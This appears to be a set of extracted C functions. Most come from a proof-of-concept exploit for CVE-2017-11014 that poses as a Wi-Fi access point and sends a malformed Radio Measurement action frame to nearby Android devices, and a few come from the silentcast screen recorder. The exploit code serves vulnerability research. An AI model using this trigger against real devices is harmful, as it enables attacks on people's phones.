{"docstring": "/*\n * try to start capturing packets from the specified interface (a wireless card\n * in monitor mode)\n *\n * on succes, we return 1, on failure, 0\n */\n", "func_signal": "int start_pcap(pcap_t **pcap)", "code": "{\n\tchar errorstr[PCAP_ERRBUF_SIZE];\n\tint datalink;\n\n\tprintf(\"[*] Starting capture on \\\"%s\\\" ...\\n\", g_iface);\n\n\t*pcap = pcap_open_live(g_iface, SNAPLEN, 8, 25, errorstr);\n\tif (*pcap == (pcap_t *)NULL) {\n\t\tfprintf(stderr, \"[!] pcap_open_live() failed: %s\\n\", errorstr);\n\t\treturn 0;\n\t}\n\n\tdatalink = pcap_datalink(*pcap);\n\tswitch (datalink) {\n\t\tcase DLT_IEEE802_11_RADIO:\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tfprintf(stderr, \"[!] Unknown datalink for interface \\\"%s\\\": %d\\n\",\n\t\t\t\t\tg_iface, datalink);\n\t\t\tfprintf(stderr, \"    Only RADIOTAP is currently supported.\\n\");\n\t\t\treturn 0;\n\t}\n\n\treturn 1;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * set the channel of the wireless card\n */\n", "func_signal": "int set_channel(void)", "code": "{\n\tchar cmd[256] = { 0 };\n\n\tsnprintf(cmd, sizeof(cmd) - 1, \"iwconfig %s channel %d\", g_iface, g_channel);\n\tif (system(cmd))\n\t\treturn 0;\n\treturn 1;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * handle sequence number generation\n */\n", "func_signal": "u_int16_t get_sequence(void)", "code": "{\n\tstatic u_int16_t sequence = 1337;\n\tuint16_t ret = sequence;\n\n\tsequence++;\n\tif (sequence > 4095)\n\t\tsequence = 0;\n\treturn ret;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * process the radiotap header\n */\n", "func_signal": "int process_radiotap(const u_char **ppkt, u_int32_t *pleft)", "code": "{\n\tconst u_char *p = *ppkt;\n\tradiotap_t *prt = (radiotap_t *)p;\n#ifdef DEBUG_RADIOTAP_PRESENT\n\tint idx = 0;\n\tu_int32_t *pu = &prt->it_present;\n#endif\n\n\tif (*pleft < sizeof(radiotap_t)) {\n\t\tfprintf(stderr, \"[!] Packet doesn't have enough data for a radiotap header?!\\n\");\n\t\treturn 0;\n\t}\n\n#ifdef DEBUG_RADIOTAP\n\tprintf(\"[*] got RADIOTAP packet - ver:%u pad:%u len:%u\\n\",\n\t\t\tprt->it_version, prt->it_pad, prt->it_len);\n#endif\n\tif (*pleft <= prt->it_len) {\n\t\tfprintf(stderr, \"[!] Packet is too small to contain the radiotap header and data\\n\");\n\t\treturn 0;\n\t}\n\n#ifdef DEBUG_RADIOTAP_PRESENT\n\tprintf(\"    present[%u]: 0x%lx\\n\", idx, (ulong)prt->it_present);\n\twhile (prt->it_present & 0x1) {\n\t\t++idx;\n\t\tprintf(\"    present[%u]: 0x%lx\\n\", idx, (ulong)pu[idx]);\n\t}\n#endif\n\n\t*ppkt = p + prt->it_len;\n\t*pleft -= prt->it_len;\n\n\treturn 1;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * return the ssid string, ensuring truncation and nul termination\n */\n", "func_signal": "char *ssid_string(ie_t *ie)", "code": "{\n\tstatic char ssid_str[32];\n\n\tif (ie->len > sizeof(ssid_str) - 1)\n\t\tstrncpy(ssid_str, (char *)ie->data, sizeof(ssid_str) - 1);\n\telse\n\t\tstrncpy(ssid_str, (char *)ie->data, ie->len);\n\treturn ssid_str;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * process the 802.11 frame\n */\n", "func_signal": "dot11_frame_t *get_dot11_frame(const u_char **ppkt, u_int32_t *pleft)", "code": "{\n\tconst u_char *p = *ppkt;\n\n\tif (*pleft < sizeof(dot11_frame_t)) {\n#ifdef DEBUG_DOT11_SHORT_PKTS\n\t\tfprintf(stderr, \"[-] Not enough data for 802.11 frame header (bytes left: %u)!\\n\", *pleft);\n\t\thexdump(p, *pleft);\n#endif\n\t\treturn NULL;\n\t}\n\n\t*ppkt = p + sizeof(dot11_frame_t);\n\t*pleft -= sizeof(dot11_frame_t);\n\n\treturn (dot11_frame_t *)p;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * open a raw socket that we can use to send raw 802.11 frames\n */\n", "func_signal": "int open_raw_socket(void)", "code": "{\n\tint sock;\n\tstruct sockaddr_ll la;\n\tstruct ifreq ifr;\n\n\tsock = socket(PF_PACKET, SOCK_RAW, ETH_P_ALL);\n\tif (sock == -1) {\n\t\tperror(\"[!] Unable to open raw socket\");\n\t\treturn -1;\n\t}\n\n\t/* build the link-level address struct for binding */\n\tmemset(&la, 0, sizeof(la));\n\tla.sll_family = AF_PACKET;\n\tla.sll_halen = ETH_ALEN;\n\n\t/* get the interface index */\n\tmemset(&ifr, 0, sizeof(ifr));\n\tstrncpy(ifr.ifr_name, g_iface, IFNAMSIZ);\n\tif (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {\n\t\tperror(\"[!] Unable to get interface index\");\n\t\tclose(sock);\n\t\treturn -1;\n\t}\n#ifdef DEBUG_IF_INDEX\n\tprintf(\"[*] Interface index: %u\\n\", ifr.ifr_ifindex);\n#endif\n\tla.sll_ifindex = ifr.ifr_ifindex;\n\n\tif (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {\n\t\tperror(\"[!] Unable to get hardware address\");\n\t\tclose(sock);\n\t\treturn -1;\n\t}\n#ifdef DEBUG_IF_HWADDR\n\tprintf(\"[*] Interface hardware address: %s\\n\", mac_string((u_int8_t *)ifr.ifr_hwaddr.sa_data));\n#endif\n\tif (!memcmp(g_bssid, \"\\x00\\x00\\x00\\x00\\x00\\x00\", ETH_ALEN))\n\t\tmemcpy(g_bssid, ifr.ifr_hwaddr.sa_data, ETH_ALEN);\n\t memcpy(la.sll_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);\n\n\t /* verify the interface uses RADIOTAP */\n\t if (ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_RADIOTAP) {\n\t\t fprintf(stderr, \"[!] bad address family: %u\\n\", ifr.ifr_hwaddr.sa_family);\n\t\t close(sock);\n\t\t return -1;\n\t }\n\n\t /* bind this socket to the interface */\n\t if (bind(sock, (struct sockaddr *)&la, sizeof(la)) == -1) {\n\t\tperror(\"[!] Unable to bind to interface\");\n\t\tclose(sock);\n\t\treturn -1;\n\t}\n\treturn sock;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * send an action frame containing a trigger for the exploit\n */\n", "func_signal": "int send_exploit_trigger(u_int8_t *dst_mac)", "code": "{\n\tu_int8_t *p = g_pkt;\n\taction_t *action;\n\tint i;\n\tu_int8_t measure_data[] = {\n\t\t0xff, 0xff, 0x05, 0xAA, 0xAA, 0xAA, 0xAA, 0x00,\n\t\t0x00, 0xAA, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, /* 16 */\n\t\t0x33, 0x32, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t   \t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 32 */\n\t\t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t   \t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 48 */\n\t   \t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t   \t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 64 */\n\t   \t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t   \t0x33, 0x32, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 80 */\n\t   \t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t   \t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 96 */\n\t   \t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t   \t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 112 */\n\t   \t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t   \t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA  /* 128 */\n\t};\n\n\tu_int8_t AP_CHANEL_REP[] = {\n\t\t0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t\t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t\t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t\t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t\t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t\t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,\n\t\t0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA\n\n\t};\n\n\tfill_radiotap(&p);\n\tfill_dot11(&p, T_MGMT, ST_ACTION, dst_mac);\n\n\taction = (action_t *)p;\n\taction->category = 0x05; // Radio Measurement\n\taction->action = 0x00; // action: Radio Measurement request\n\taction->dialog = 0x0f; // ??\n\taction->repetitions = 0; // ??\n\tp = (u_int8_t *)(action + 1);\n\n\t//for (i = 0; i < 1; i++)\n\tfill_ie(&p, 38, measure_data, sizeof(measure_data));\n\tfill_ie(&p, 51, AP_CHANEL_REP, sizeof(AP_CHANEL_REP));\n\tfill_ie(&p, 51, AP_CHANEL_REP, sizeof(AP_CHANEL_REP));\n\n\tg_pkt_len = p - g_pkt;\n\tif (send(g_sock, g_pkt, g_pkt_len, 0) == -1)\n\t\treturn 0;\n\n\tprintf(\"[*] Sent action frame to %s!\\n\", mac_string(dst_mac));\n\treturn 1;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * handle periodic tasks that need to be done\n */\n", "func_signal": "int process_periodic_tasks(void)", "code": "{\n\tif (g_send_beacons) {\n\t\t/* we didn't get a pcket yet, do periodic processing */\n\t\tstruct timespec now, diff;\n\n\t\tif (clock_gettime(CLOCK_REALTIME, &now)) {\n\t\t\tperror(\"[!] clock_gettime failed\");\n\t\t\treturn 0;\n\t\t}\n\n\t\t/* see how long since the last beacon. if it's been long enough,\n\t\t * send another */\n\t\ttimespec_diff(&now, &last_beacon, &diff);\n\t\tif (diff.tv_sec > 0 || diff.tv_nsec > BEACON_INTERVAL * 1000000) {\n#ifdef DEBUG_BEACON_INTERVAL\n\t\t\tprintf(\"%lu.%lu - %lu.%lu = %lu.%lu (vs %lu)\\n\",\n\t\t\t\t\t(ulong)now.tv_sec, now.tv_nsec,\n\t\t\t\t\t(ulong)last_beacon.tv_sec, last_beacon.tv_nsec,\n\t\t\t\t\t(ulong)diff.tv_sec, diff.tv_nsec,\n\t\t\t\t\t(ulong)BEACON_INTERVAL * 1000000);\n#endif\n\t\t\tif (!send_beacon())\n\t\t\t\treturn 1; /* treat error as warning */\n\t\t\tlast_beacon = now;\n\t\t}\n\t} /* if (g_send_beacons) */\n\n\treturn 1;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * create the ascii representation of the specified mac address\n */\n", "func_signal": "char *mac_string(u_int8_t *mac)", "code": "{\n\tstatic char mac_str[32];\n\tchar *p = mac_str;\n\tint i;\n\n\tfor (i = 0; i < ETH_ALEN; i++) {\n\t\tu_int8_t hi = mac[i] >> 4;\n\t\tu_int8_t lo = mac[i] & 0xf;\n\n\t\tif (hi > 9)\n\t\t\t*p++ = hi - 10 + 'a';\n\t\telse\n\t\t\t*p++ = hi + '0';\n\t\tif (lo > 9)\n\t\t\t*p++ = lo - 10 + 'a';\n\t\telse\n\t\t\t*p++ = lo + '0';\n\t\tif (i < ETH_ALEN - 1)\n\t\t\t*p++ = ':';\n\t}\n\t*p = '\\0';\n\n\treturn mac_str;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * fill in an information element\n */\n", "func_signal": "void fill_ie(u_int8_t **ppkt, u_int8_t id, u_int8_t *data, u_int8_t len)", "code": "{\n\tu_int8_t *p = *ppkt;\n\tie_t *ie = (ie_t *)p;\n\n\t/* add the ssid IE */\n\tie->id = id;\n\tie->len = len;\n\n\tp = (u_int8_t *)(ie + 1);\n\tmemcpy(p, data, len);\n\n\tp += len;\n\t*ppkt = p;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * process an 802.11 association request destined for us\n */\n", "func_signal": "int process_assoc_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)", "code": "{\n\tassoc_req_t *assoc;\n\tie_t *ie;\n\n\tif (left < sizeof(assoc_req_t)) {\n\t\tfprintf(stderr, \"[-] (%s) Association request without parameters!\\n\", mac_string(d11->src_mac));\n\t\treturn 1;\n\t}\n\tassoc = (assoc_req_t *)data;\n\n\tdata += sizeof(assoc_req_t);\n\tleft -= sizeof(assoc_req_t);\n\n\tif (!(ie = get_ssid_ie(data, left))) {\n\t\tprintf(\"[*] (%s) Association request without SSID received (caps:0x%x, interval: %u), replying...\\n\",\n\t\t\t\tmac_string(d11->src_mac),\n\t\t\t\tassoc->caps, assoc->interval);\n\t} else {\n\t\tprintf(\"[*] (%s) Association request for \\\"%s\\\" received (caps:0x%x, interval: %u), replying...\\n\",\n\t\t\t\tmac_string(d11->src_mac),\n\t\t\t\tssid_string(ie),\n\t\t\t\tassoc->caps, assoc->interval);\n\t}\n\n\tg_state = S_SENT_ASSOC_RESP;\n\tif (!send_assoc_response(d11->src_mac))\n\t\treturn 1; /* treat send errors as a warning */\n\treturn 1;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * process an 802.11 authentication request\n */\n", "func_signal": "int process_auth_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)", "code": "{\n\tauth_t *auth;\n\n\tif (left < sizeof(auth_t)) {\n\t\tfprintf(stderr, \"[-] (%s) Auth request without parameters!\\n\", mac_string(d11->src_mac));\n\t\treturn 1;\n\t}\n\n\tauth = (auth_t *)data;\n\tif (auth->seq != 1) {\n\t\tfprintf(stderr, \"[-] Authentication sequence is not 0x0001 !!\\n\");\n\t}\n\n\tprintf(\"[*] (%s) Auth request received (alg:0x%x, seq:%u, status:%u), replying...\\n\",\n\t\t\tmac_string(d11->src_mac),\n\t\t\tauth->algorithm, auth->seq, auth->status);\n\n\tg_state = S_SENT_AUTH;\n\tif (!send_auth_response(d11->src_mac))\n\t\treturn 1; /* treat send errors as a warning */\n\n\treturn 1;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "//./include/media/msmb_isp.h\n", "func_signal": "static int open_subdev(const char* dev)", "code": "{\n\tint fd = open(dev, O_RDWR);\n\tif (fd < 0) {\n\t\tprintf(\"Failed to open %s\\n\", dev);\n\t\texit(EXIT_FAILURE);\n\t}\n\treturn fd;\n}", "path": "Android_Kernel_CVE_POCs/CVE-2016-2061.c", "commit_date": "2016-06-06 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * fill the radio tap header in for a packet\n */\n", "func_signal": "void fill_radiotap(u_int8_t **ppkt)", "code": "{\n\tu_int8_t *p = *ppkt;\n\tradiotap_t *prt = (radiotap_t *)p;\n\n\t/* fill out the radio tap header */\n\tprt->it_version = 0;\n\tprt->it_len = sizeof(*prt) + 1;\n\tprt->it_present = (1 << IEEE80211_RADIOTAP_RATE);\n\n\tp += sizeof(radiotap_t);\n\n\t/* add the data rate (data of the radiotap header) */\n\t*p++ = 0x4;  // 2Mb/s\n\n\t*ppkt = p;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * process an 802.11 probe request\n */\n", "func_signal": "int process_probe_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)", "code": "{\n\tie_t *ie;\n\tchar ssid_req[32] = { 0 };\n\n\tif (!(ie = get_ssid_ie(data, left))) {\n\t\tfprintf(stderr, \"[-] Probe request with no SSID encountered!\\n\");\n\t\treturn 1; /* just a warning */\n\t}\n\n\t/* the ssid might be empty, or might be too long */\n\tif (ie->len > 0)\n\t\tstrcpy(ssid_req, ssid_string(ie));\n\n\t/* there are broadcast and unicast probe requests... */\n\tif (!memcmp(d11->dst_mac, g_bssid, ETH_ALEN)) {\n\t\t/* for us!? */\n#ifndef DONT_CHECK_SSID_ON_UNICAST\n\t\tif (!strcmp(ssid_req, (char *)g_ssid)) {\n\t\t\tprintf(\"[*] (%s) Probe request for our BSSID and SSID, replying...\\n\", mac_string(d11->src_mac));\n\t\t\tg_state = S_SENT_PROBE_RESP;\n\t\t\tif (!send_probe_response(d11->src_mac))\n\t\t\t\treturn 1; /* treat send errors as a warning */\n\t\t}\n#else\n\t\tprintf(\"[*] (%s) Probe request for our BSSID, replying...\\n\", mac_string(d11->src_mac));\n\t\tg_state = S_SENT_PROBE_RESP;\n\t\tif (!send_probe_response(d11->src_mac))\n\t\t\treturn 1; /* treat send errors as a warning */\n#endif\n\t} else if (!memcmp(d11->dst_mac, IEEE80211_BROADCAST_ADDR, ETH_ALEN)) {\n\t\t/* broadcast probe request - discovery? */\n\t\t/* NOTE: this is the active-scan equivalent of a beacon -- no state change here */\n\t\tif (ie && ie->len > 0) {\n\t\t\t/* we must check the SSID on broadcast probes */\n\t\t\tif (!strcmp(ssid_req, (char *)g_ssid)) {\n\t\t\t\tprintf(\"[*] (%s) Broadcast probe request for our SSID \\\"%s\\\" received, replying...\\n\", mac_string(d11->src_mac), ssid_req);\n\t\t\t\tif (!send_probe_response(d11->src_mac))\n\t\t\t\t\treturn 1; /* treat send errors as a warning */\n\t\t\t} else {\n\t\t\t\tprintf(\"[*] (%s) Broadcast probe request for \\\"%s\\\" received, NOT replying...\\n\", mac_string(d11->src_mac), ssid_req);\n\t\t\t}\n\t\t} else {\n\t\t\tprintf(\"[*] (%s) Broadcast probe request received, replying...\\n\", mac_string(d11->src_mac));\n\t\t\tif (!send_probe_response(d11->src_mac))\n\t\t\t\treturn 1; /* treat send errors as a warning */\n\t\t}\n\t} /* mac check */\n\telse {\n\t\tif (ie->len > 0) {\n\t\t\tprintf(\"[*] (%s) Unhandled probe request for SSID (%u bytes): \\\"%s\\\"\\n\", mac_string(d11->src_mac), ie->len, ssid_req);\n\t\t} else {\n\t\t\tprintf(\"[*] (%s) Unhandled probe request for empty SSID\\n\", mac_string(d11->src_mac));\n\t\t}\n\t}\n\treturn 1;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/* Handle button press events (i.e. mouse clicks) \n * by either drawing a rectangle with top-left corner at \n * the mouse pointer, change the size of the rectangle \n * to put the lower-right corner at the mouse position,\n * or bring up a menu, depending on which button is pressed.\n */\n", "func_signal": "static gboolean\nbutton_press_event_cb (GtkWidget      *widget,\n                       GdkEventButton *event,\n                       gpointer        data)", "code": "{\n  cairo_surface_t *surface = P(\"surface\");\n  GdkRectangle *p_area_rect = P(\"p_area_rect\");\n  \n  /* paranoia check, in case we haven't gotten a configure event */\n  if (surface == NULL) return FALSE;\n\n  if (event->button == GDK_BUTTON_PRIMARY) { // left click\n    position_rect ((int) event->x, (int) event->y, p_area_rect);\n    draw_rect (widget, p_area_rect, surface);\n  } else if (event->button == GDK_BUTTON_SECONDARY) { // right click\n    resize_rect ((int) event->x, (int) event->y, p_area_rect);\n    draw_rect (widget, p_area_rect, surface);\n  } else if (event->button == GDK_BUTTON_MIDDLE) { // middle click\n    gboolean *p_include_extents = P(\"p_include_extents\");\n    *p_include_extents = !*p_include_extents;\n    set_rect_around_active_window (widget, p_area_rect, P(\"p_actv_win\"), P(\"p_extents\"), p_include_extents); \n    draw_rect (widget, p_area_rect, surface);\n  }\n\n  /* The event is handled, stop processing */\n  return TRUE;\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/* Create a new surface in widget's window to store rectangle */\n", "func_signal": "static gboolean\nconfigure_surface_cb (GtkWidget *widget,\n              GdkEventConfigure *event,\n              gpointer           data)", "code": "{\n\n  //the translucent fullscreen drawing surface\n  static cairo_surface_t *surface = NULL;\n  //set a place to store the surface geometry\n  static GdkRectangle surface_rect = { 0, 0 ,0, 0 }, *p_surface_rect = &surface_rect; \n\n  gtk_window_get_size (GTK_WINDOW (widget), &surface_rect.width, &surface_rect.height);\n  gtk_window_get_position (GTK_WINDOW(widget), &surface_rect.x, &surface_rect.y);\n  surface = gdk_window_create_similar_surface (gtk_widget_get_window (widget),\n                                               CAIRO_CONTENT_COLOR_ALPHA,\n                                               surface_rect.width,\n                                               surface_rect.height);\n  P_SET(surface);\n  P_SET(p_surface_rect);\n\n  /* configure event is handled, no need for further processing. */\n  return TRUE;\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/* Handle motion events (i.e mouse drag) \n * by continuing to move and draw if button 1 (left) is\n * still held down, or continuing to resize and draw \n * if button 3 (right) is held down \n */\n", "func_signal": "static gboolean\nmotion_notify_event_cb (GtkWidget      *widget,\n                        GdkEventMotion *event,\n                        gpointer        data)", "code": "{\n  cairo_surface_t *surface = P(\"surface\");\n  GdkRectangle *p_area_rect = P (\"p_area_rect\");\n  double *presets = P(\"presets\");\n\n  /* paranoia check, in case we haven't gotten a configure event */\n  if (surface == NULL) return FALSE;\n\n  if (event->state & GDK_BUTTON1_MASK) {\n    position_rect (event->x, event->y, p_area_rect);\n    draw_rect (widget, p_area_rect, surface);\n  } else if (event->state & GDK_BUTTON2_MASK) { \n    drag_resize_to_preset (event->x, event->y, presets, p_area_rect);\n    draw_rect (widget, p_area_rect, surface);\n  } else if (event->state & GDK_BUTTON3_MASK) {\n    resize_rect (event->x, event->y, p_area_rect);\n    draw_rect (widget, p_area_rect, surface);\n  } \n\n  /* It's handled, stop processing */\n  return TRUE;\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/* Pressing RETURN triggers iconify which triggers this to make the uncompressed recording to silentcast/temp.mkv \n * This is also triggered when the drawing surface window becomes tiled since tiling window managers can't iconify\n * The ffmpeg command will save a log in ffcom.log because the appropriate environment \n * variable was set in setup_widget_data_pointers\n */\n", "func_signal": "static void run_ffcom (GtkWidget *widget)", "code": "{\n  //Before running the ffmpeg command, make working directory/silentcast if it doesn't exist\n  char silentcast_dir[PATH_MAX];\n  strcpy (silentcast_dir, gtk_entry_buffer_get_text (P(\"working_dir\")));\n  strcat (silentcast_dir, \"/silentcast\");\n  char *glib_encoded_silentcast_dir = SC_get_glib_filename (widget, silentcast_dir);\n  if (glib_encoded_silentcast_dir) {\n    g_mkdir_with_parents (glib_encoded_silentcast_dir, 0700); //can't enter a directory unless it has execute privilage, so 700 instead of 600\n    GdkRectangle *mon_rect = P(\"p_surface_rect\");\n    get_ffcom(P(\"ffcom_string\"), P(\"p_area_rect\"), mon_rect->x, mon_rect->y, P(\"p_fps\"));\n    SC_spawn (widget, P(\"ffcom_string\"), P(\"p_ffcom_pid\"), \"\", \"\"); \n    g_free (glib_encoded_silentcast_dir);\n    gboolean *p_ffcom_is_running = P(\"p_ffcom_is_running\");\n    *p_ffcom_is_running = TRUE;\n  }\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/* SC_get_geometry_for (...) trys to get the Gdk geometry for the GdkWindow\n * matching the passed X11 window with children, getting both the internal\n * window geometry and it's extents (title-bar/frame). If can't get Gdk info\n * will get the X11 geometry, setting both inner and extents geometry to\n * the same values. \n */\n", "func_signal": "void\nSC_get_geometry_for (Window aw, Window *aw_children, ssize_t n, GdkRectangle *win_rect, GdkRectangle *extents, GdkWindow* *dwindow)", "code": "{\n  unsigned int bwidth = 0, depth = 0, width, height;\n  int x, y;\n  Window root = 0;\n  \n  if (SC_get_active_gdkwindow (aw, aw_children, n, dwindow)) {\n    gdk_window_get_frame_extents (*dwindow, extents); //{top-left corner, width & height} of title-bar/borders\n    gdk_window_get_origin(*dwindow, &x, &y); //top-left corner of interior window (not title bar/borders)\n    width = gdk_window_get_width (*dwindow); //width of interior window\n    height = gdk_window_get_height (*dwindow); //height of interior window\n    win_rect->x = x;\n    win_rect->y = y;\n    win_rect->width = (int) width;\n    win_rect->height = (int) height;\n  } else {\n    fprintf (stderr, \"Failed to get GdkWindow. Falling back on X11 geometry of active window, saved as both extents and interior geometry.\");\n    Display* d = XOpenDisplay (NULL); //mem leak\n    if (d) {\n      XGetGeometry (d, aw, &root, &x, &y, &width, &height, &bwidth, &depth);\n      XCloseDisplay (d);\n      extents->x = x;\n      extents->y = y;\n      extents->width = (int) width;\n      extents->height = (int) height;\n    }\n  }\n}", "path": "silentcast/lib/SC_X11_get_active_window.c", "commit_date": "2017-04-13 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "//executed when done button is clicked from show_edit_pngs\n", "func_signal": "static gboolean make_anim_gif_cb (GtkWidget *done, gpointer data)", "code": "{\n  char convert_com[200], delay[5];\n  GtkWidget *edit_pngs_widget = gtk_widget_get_toplevel (done);\n  GtkWidget *widget = GTK_WIDGET(gtk_window_get_transient_for (GTK_WINDOW(edit_pngs_widget)));\n  int *p_group = P(\"p_group\"), *p_total_group = P(\"p_total_group\"), *p_fps = P(\"p_fps\");\n\n  //close the widget that had the done button on it\n  gtk_widget_destroy (edit_pngs_widget);\n\n  char silentcast_dir[PATH_MAX];\n  get_silentcast_dir (widget, silentcast_dir);\n  delete_pngs (widget, silentcast_dir, *p_group); //delete all but 1 out of every group number of pngs (group set in edit_pngs)\n\n  //remove pre-existing anim.gif before making a new one\n  char animgif_filepath[PATH_MAX];\n  strcpy (animgif_filepath, silentcast_dir);\n  strcat (animgif_filepath, \"/anim.gif\");\n  char *glib_encoded_animgif = SC_get_glib_filename (widget, animgif_filepath);\n  g_remove (glib_encoded_animgif);\n  g_free (glib_encoded_animgif);\n\n  //construct convert_com: convert -adjoin -delay (total_group * fps) -layers optimize ew-[0-9][0-9][0-9].png anim.gif\n  *p_total_group = *p_total_group + *p_group;\n  strcpy (convert_com, \"/bin/sh -c '/usr/bin/convert -adjoin -delay \");\n  snprintf (delay, 5, \"%d\", *p_total_group * 